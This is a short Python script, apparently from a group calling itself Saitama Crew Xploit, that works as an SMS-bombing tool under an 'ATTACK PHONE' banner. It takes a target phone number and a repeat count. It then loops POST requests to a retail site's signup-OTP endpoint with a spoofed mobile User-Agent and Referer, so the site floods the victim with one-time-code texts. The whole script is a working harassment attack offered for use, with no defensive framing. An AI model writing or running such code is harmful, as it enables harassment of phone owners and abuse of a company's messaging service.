#SEMOGA YANG RECODE MATI
import os, requests
from requests import post
import termcolor
from termcolor import colored
import time
os.system("clear")

banner = """
┈┈┈╲┈┈┈┈╱
┈┈┈╱    ╲         ATTACK PHONE
┈┈┃┈▇┈┈▇┈┃     <×=============×>
╭╮┣━━━━━━┫╭╮           ___
┃┃┃┈┈┈┈┈┈┃┃┃    /===> [ ' ] 
╰╯┃┈┈┈┈┈┈┃╰|========> [   ]
┈┈╰┓┏━━┓┏╯      \===> [_¤_]
┈┈┈╰╯┈┈╰╯
<×======================================×>
  |Code by : Xnot_Found   |
  |Github : https://github.com/SaitamaCrewXploit/ |
  |Team : Saitama Crew Xploit      |
  |Gmail : saitamacrewxploit@gmail.com         |
  |Virus : Virus type pesan berbahaya              |
<×======================================×>
 """

print(banner)
no = input(colored('NOMOR TARGET BEB:','red'))
jml = int(input(colored('JUMLAH PIRUS NJING:','red')))
ua = {
'Connection': 'keep-alive',
'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1; CPH1605) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36',
'Referer': 'https://www.mapclub.com/en/user/signup',
}

dat = {
'phone': no,
}
for x in range(jml):
	time.sleep(20)
	sendSms = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=ua, data=dat)

	if 'error' in sendSms.text:	
          
         	print("PIRUSNYA GAGAL TERKIRIM KE  " + no + " ! ")

	else:
		print(" YEEE PIRUSNYA BERHASIL TERKIRIM KE " + no + " ! ")
